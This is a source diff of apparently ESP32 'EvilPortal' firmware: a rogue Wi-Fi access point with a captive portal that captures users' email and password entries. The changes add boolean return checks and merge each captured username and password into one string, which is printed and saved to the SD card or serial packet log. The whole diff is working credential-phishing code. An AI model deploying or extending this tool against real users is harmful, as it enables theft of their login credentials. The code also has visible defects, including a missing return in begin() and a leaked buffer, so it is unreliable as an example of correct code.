@@ -10,11 +10,13 @@ EvilPortal::EvilPortal() {
   this->has_ap = false;
 }
 
-void EvilPortal::begin() {
+bool EvilPortal::begin() {
   // wait for init flipper input
-  this->setAP();
-  this->setHtml();
-
+  if (!this->setAP())
+    return false;
+  if (!this->setHtml())
+    return false;
+    
   startPortal();
 }
 
@@ -41,7 +43,6 @@ void EvilPortal::setupServer() {
       inputParam = "email";
       this->user_name = inputMessage;
       this->name_received = true;
-      Serial.println(this->user_name);
     }
 
     if (request->hasParam("password")) {
@@ -49,7 +50,6 @@ void EvilPortal::setupServer() {
       inputParam = "password";
       this->password = inputMessage;
       this->password_received = true;
-      Serial.println(this->password);
     }
     request->send(
       200, "text/html",
@@ -58,12 +58,12 @@ void EvilPortal::setupServer() {
   Serial.println("web server up");
 }
 
-void EvilPortal::setHtml() {
+bool EvilPortal::setHtml() {
   Serial.println("Setting HTML...");
   File html_file = sd_obj.getFile("/index.html");
   if (!html_file) {
     Serial.println("Could not open index.html. Exiting...");
-    return;
+    return false;
   }
   else {
     String html = "";
@@ -75,15 +75,16 @@ void EvilPortal::setHtml() {
     strncpy(this->index_html, html.c_str(), strlen(html.c_str()));
     this->has_html = true;
     Serial.println("html set");
-    html_file.close();    
+    html_file.close();
+    return true;
   }
 }
 
-void EvilPortal::setAP() {
+bool EvilPortal::setAP() {
   File ap_config_file = sd_obj.getFile("/ap.config.txt");
   if (!ap_config_file) {
     Serial.println("Could not open ap.config.txt. Exiting...");
-    return;
+    return false;
   }
   else {
     String ap_config = "";
@@ -97,6 +98,7 @@ void EvilPortal::setAP() {
     this->has_ap = true;
     Serial.println("ap config set");
     ap_config_file.close();
+    return true;
   }
 }
 
@@ -124,6 +126,36 @@ void EvilPortal::startPortal() {
   this->runServer = true;
 }
 
+void EvilPortal::convertStringToUint8Array(const String& str, uint8_t*& buf, uint32_t& len) {
+  len = str.length(); // Obtain the length of the string
+
+  buf = new uint8_t[len]; // Dynamically allocate the buffer
+
+  // Copy each character from the string to the buffer
+  for (uint32_t i = 0; i < len; i++) {
+    buf[i] = static_cast<uint8_t>(str.charAt(i));
+  }
+}
+
+void EvilPortal::addLog(String log, int len) {
+  //uint8_t *buf;
+  //log.getBytes(buf, strlen(log.c_str()));  
+  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
+  if (save_packet) {
+    uint8_t* logBuffer = nullptr;
+    uint32_t logLength = 0;
+    this->convertStringToUint8Array(log, logBuffer, logLength);
+    
+    #ifdef WRITE_PACKETS_SERIAL
+      buffer_obj.addPacket(logBuffer, logLength, true);
+    #elif defined(HAS_SD)
+      sd_obj.addPacket(logBuffer, logLength, true);
+    #else
+      return;
+    #endif
+  }
+}
+
 void EvilPortal::main(uint8_t scan_mode) {
   if (scan_mode == WIFI_SCAN_EVIL_PORTAL) {
     this->dnsServer.processNextRequest();
@@ -133,8 +165,9 @@ void EvilPortal::main(uint8_t scan_mode) {
       String logValue1 =
           "u: " + this->user_name;
       String logValue2 = "p: " + this->password;
-      Serial.println(logValue1);
-      Serial.println(logValue2);
+      String full_string = logValue1 + " " + logValue2 + "\n";
+      Serial.print(full_string);
+      this->addLog(full_string, full_string.length());
     }
   }
 }
